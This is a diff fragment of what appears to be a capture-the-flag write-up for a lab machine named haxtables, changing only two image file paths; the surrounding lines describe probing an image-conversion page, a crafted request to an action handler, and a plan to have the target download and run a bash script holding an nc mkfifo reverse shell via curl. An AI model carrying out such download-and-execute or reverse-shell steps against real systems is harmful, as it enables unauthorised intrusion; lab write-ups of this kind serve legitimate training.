@@ -60,7 +60,7 @@ There was a `utils.php` file, which could be something. Also there were lots of 
 
 On the main page, there were the type of conversions available, which were **string, integer and images**. The image one was the most suspicious.
 
-<figure><img src="../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 This was the only page that didn't have any API endpoint to use. When checking out `/v2` and `/v1`, it just tells me the page is under construction due to security issues.&#x20;
 
@@ -271,7 +271,7 @@ Content-Length: 6715
 "uri_path":"test@image.haxtables.htb/actions/action_handler.php?page=[OUTPUT]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 Now, we can use `curl` to get the machine to download and execute a bash script. I created a script named `g` with the `nc mkfifo` shell. Then, I used this line of code:
 
